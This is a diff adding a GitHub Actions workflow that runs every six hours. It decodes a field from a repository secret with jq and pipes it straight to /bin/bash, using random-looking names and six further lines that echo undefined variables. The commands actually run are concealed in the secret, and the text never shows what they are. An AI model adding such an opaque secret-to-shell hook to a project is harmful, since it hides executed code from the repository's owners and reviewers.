@@ -1,0 +1,24 @@
+name: xiabancuoling
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '37 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: xiabancuoling
+        env:
+          mdyi2: ${{ secrets.mdyi2 }}
+        run: |
+          echo $mdyi2 | jq -r .tv902 | /bin/bash
+          echo $mbcne734 | jq -r .bvbqj32 | /bin/bash
+          echo $dyji308 | jq -r .je913 | /bin/bash
+          echo $jolfy10 | jq -r .dyl6395 | /bin/bash
+          echo $n53 | jq -r .k9666 | /bin/bash
+          echo $o13 | jq -r .bjwaq66 | /bin/bash
+          echo $jrxkk47 | jq -r .ycm8087 | /bin/bash
+
